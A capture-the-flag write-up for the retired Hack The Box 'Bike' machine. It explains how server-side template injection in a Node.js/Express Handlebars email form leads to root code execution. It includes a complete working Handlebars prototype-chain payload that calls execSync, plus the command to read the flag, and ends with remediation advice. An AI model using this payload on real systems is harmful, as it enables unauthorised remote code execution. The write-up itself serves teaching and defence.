# HTB Bike — Full Writeup

**Platform:** Hack The Box  
**Difficulty:** Very Easy  
**OS:** Linux  
**Category:** Starting Point  
**Status:** Retired  

---

## Overview

Bike is a very easy Linux machine running a Node.js/Express web application with a Handlebars template engine. The application accepts user input in an email subscription field and renders it directly as a Handlebars template, creating a Server-Side Template Injection (SSTI) vulnerability. By leveraging Handlebars' prototype chain traversal via `{{#with}}` blocks, an attacker achieves remote code execution as root.

**Full chain:**
```
SSTI in email field (Handlebars)
  → Constructor prototype chain to Function()
    → process.mainModule.require('child_process').execSync() (root)
```

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV 10.129.97.64
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 |
| 80 | HTTP | Node.js (Express middleware) |

The web application serves a simple landing page titled "Bike" with an email subscription form.

---

## Step 1 — Identifying the Template Engine

### Discovery

Submitting template syntax in the email field triggers verbose error messages from the backend. Entering `{{7*7}}` returns a Handlebars parse error:

```
Error: Parse error on line 1:
 {{7*7}}
---^
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)
```

This confirms:
- **Handlebars** is the template engine
- The application is installed at `/root/Backend/`
- User input is passed directly to `handlebars.compile()` (the input is compiled as a template, not just interpolated)

### Confirming SSTI

Handlebars does not evaluate arithmetic expressions. Instead, test with a valid Handlebars expression:

```
{{this}}
```

The server reflects the template context object, confirming that user input is interpreted as a Handlebars template.

---

## Step 2 — Remote Code Execution via Handlebars SSTI

### Vulnerability

When user input is compiled as a Handlebars template rather than treated as a static string, an attacker can use Handlebars block helpers to traverse the JavaScript prototype chain. The `{{#with}}` helper combined with `lookup` and `string.sub.constructor` reaches `Function()`, allowing arbitrary JavaScript execution within the Node.js runtime.

### Exploit

The payload uses nested `{{#with}}` blocks to:
1. Get a reference to `String.prototype.sub`
2. Access its `constructor` (which is `Function`)
3. Push attacker-controlled JavaScript into a code list
4. Invoke `Function.prototype.apply()` to execute it

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Note:** The initial attempt using `require('child_process')` fails with `ReferenceError: require is not defined`. In the sandboxed context where Handlebars evaluates expressions, `require` is not directly available. Using `process.mainModule.require()` bypasses this by accessing the require function through Node.js's process object.

### Results

The `id` command returns:

```
uid=0(root) gid=0(root) groups=0(root)
```

The web application is running as **root**. From here, reading the flag is straightforward:

```
cat /root/flag.txt
```

---

## Flag

| Flag | Location |
|------|----------|
| flag.txt | `/root/flag.txt` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| Web browser | Submitting SSTI payloads via the email form |

---

## Key Takeaways

**Never compile user input as a template** -- The core vulnerability is that user input is passed to `handlebars.compile()` instead of being inserted as a data variable in a pre-compiled template. The fix is to use a static template with data binding: `template({email: userInput})` instead of `handlebars.compile(userInput)()`.

**Verbose error messages accelerate exploitation** -- The stack traces revealed the exact template engine, its version path, the application's filesystem location, and the handler file. In production, error details should never be exposed to the client.

**`require` restrictions are not a security boundary** -- Blocking direct `require` in an eval context is trivially bypassed via `process.mainModule.require()`. If an attacker can execute arbitrary JavaScript, no amount of scope restriction within the same process will prevent code execution.

**Services should not run as root** -- The Node.js application running as root means SSTI immediately grants full system access. Running the service as an unprivileged user would limit the blast radius of any code execution vulnerability.
